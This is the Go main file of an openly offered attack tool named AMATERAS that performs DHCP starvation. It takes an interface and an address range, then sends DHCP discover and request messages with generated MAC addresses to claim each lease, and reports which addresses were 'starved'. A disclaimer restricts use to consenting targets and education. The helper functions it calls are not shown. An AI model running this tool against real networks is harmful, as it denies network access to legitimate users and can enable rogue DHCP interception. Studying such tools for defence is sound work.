package main

import (
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"sync"
	"time"

	"github.com/pterm/pterm"
)

type IPsStatus struct {
	IP          net.IP
	Message     string
	Starved     bool
	NoFreeLease bool
}

var (
	wg            sync.WaitGroup
	ListIPsStatus []IPsStatus
	mainCmd       *flag.FlagSet
	InterfaceName string
	StartAddress  string
	EndAddress    string
	Verbose       bool
)

func init() {

	pterm.Println()
	str := pterm.DefaultHeader.WithBackgroundStyle(pterm.NewStyle(pterm.BgLightRed)).WithMargin(10).Sprintf(
		"AMATERAS - DHCP Starvation attack exploitation tool")

	pterm.DefaultCenter.Print(str)

	pterm.DefaultCenter.WithCenterEachLineSeparately().Printf(
		fmt.Sprintf("Created by %v - (%v)\ncontact[%s]yasser-janah.com", pterm.LightRed("Yasser JANAH"), pterm.LightGreen("th3x0ne"), pterm.Cyan("at")))

	pterm.DefaultCenter.WithCenterEachLineSeparately().Printf("-----------------\n")
	printer := pterm.Info
	printer.Prefix = pterm.Prefix{
		Text:  "DISCLAIMER",
		Style: pterm.NewStyle(pterm.BgCyan, pterm.FgRed),
	}
	newStyle := printer.Prefix.Style.Add(*pterm.NewStyle(pterm.FgLightRed), *pterm.NewStyle(pterm.BgDefault))
	printer.Prefix.Style = &newStyle
	*printer.MessageStyle = printer.MessageStyle.Add(*pterm.NewStyle(pterm.FgLightWhite))
	str = printer.Sprintf("Usage of " + pterm.Green(pterm.Blink.Sprintf("AMATERAS")) + " for attacking targets without prior mutual consent is illegal." +
		"\nIt's the end user's responsibility to obey all applicable local, state and federal laws." +
		"\nDevelopers assume no liability and are not responsible for any misuse or damage caused " +
		"\nby this program. Only use for educational purposes.")

	pterm.DefaultCenter.Println(str)

	mainCmd = flag.NewFlagSet("run", flag.ExitOnError)

	mainCmd.Usage = func() {
		pterm.Printfln("%s %s %s:\n", pterm.Blue("•••"), pterm.White("Usage of"), pterm.Green(os.Args[0]))
		pterm.Printfln("\t%s %s %s\n", pterm.Yellow("-iface"), pterm.Cyan("string"), pterm.White("Interface to start attack."))
		pterm.Printfln("\t%s %s %s\n", pterm.Yellow("-start"), pterm.Cyan("IPv4"), pterm.White("Range start address."))
		pterm.Printfln("\t%s %s %s\n", pterm.Yellow("-end"), pterm.Cyan("IPv4"), pterm.White("Range end address."))
		pterm.Printfln("\t%s %s %s\n", pterm.Yellow("-verbose"), pterm.Cyan("bool"), pterm.White("Show more details."))
	}

	mainCmd.StringVar(&InterfaceName, "iface", "", "")
	mainCmd.StringVar(&StartAddress, "start", "", "")
	mainCmd.StringVar(&EndAddress, "end", "", "")
	mainCmd.BoolVar(&Verbose, "verbose", false, "")
}

func main() {

	if len(os.Args) != 8 && len(os.Args) != 9 {
		mainCmd.Usage()
		os.Exit(1)
	}

	mainCmd.Parse(os.Args[2:])

	pterm.Println()
	pterm.Info.Println("Starting at:", pterm.Green(time.Now().Format("02 Jan 2006 - 15:04:05 MST")))
	pterm.Println()

	start := net.ParseIP(StartAddress)
	end := net.ParseIP(EndAddress)

	iface, err := net.InterfaceByName(InterfaceName)
	check(err)

	d, err := NewDHCPStarvation(iface, nil, start, end)
	check(err)

	mainSpinner, _ := pterm.DefaultSpinner.Start("Preparing hosts for attack...")
	time.Sleep(time.Second * 2)
	check(d.Hosts())
	mainSpinner.Success(fmt.Sprintf("%v Done", pterm.LightWhite("Preparing hosts for attack...")))

	pterm.DefaultSection.Printf("Attacking using %v and range %v - %v (available hosts: %v). \n",
		pterm.Green(iface.Name), pterm.Green(start.String()), pterm.Green(end.String()),
		pterm.LightGreen(d.IPRangeCount()))

	// var mutex = &sync.Mutex{}

	for _, host := range d.hosts {
		// mutex.Lock()
		wg.Add(1)
		go d.Run(host, &wg)
		// mutex.Unlock()

	}

	wg.Wait()

	for _, is := range ListIPsStatus {

		if is.NoFreeLease {
			pterm.Warning.Printf("*** %v - failed to starving (reason:%v) *** \n", pterm.LightWhite(is.IP), pterm.LightRed(is.Message))
			continue
		}

		if is.Starved {
			pterm.Success.Printf("*** %v - Successfully Starved *** \n", pterm.LightWhite(is.IP))
		} else {
			pterm.Warning.Printf("*** failed to starving - %v (reason:%v) *** \n", pterm.LightWhite(is.IP), pterm.LightRed(is.Message))
		}

	}
	pterm.Println()

}

func (d DHCPStarvation) Run(ip net.IP, wg *sync.WaitGroup) {

	defer wg.Done()

	// Generate Magic Cookie
	rand.Seed(time.Now().Unix())
	xid := rand.Uint32()

	d.GenerateMAC()
	d.SendDHCPDiscover(xid)
	d.offredIP = ip
	time.Sleep(time.Second * 3)

	if offer := d.WaitForDHCPOffer(nil); offer {
		// Send DHCP Request
		d.SendDHCPRequest(xid)

		msg, starved := d.WaitForDHCPNACK()
		if starved {
			ListIPsStatus = append(ListIPsStatus, IPsStatus{IP: d.offredIP, Message: msg, Starved: starved, NoFreeLease: false})
		} else {
			ListIPsStatus = append(ListIPsStatus, IPsStatus{IP: d.offredIP, Message: msg, Starved: starved, NoFreeLease: false})
		}
		return
	}

	ListIPsStatus = append(ListIPsStatus, IPsStatus{IP: ip, Message: "may be no free leases", Starved: false, NoFreeLease: true})

}

func check(err error) {
	if err != nil {
		pterm.Error.Printf("%v\n", err)
		pterm.Println()
		os.Exit(-1)
	}
}
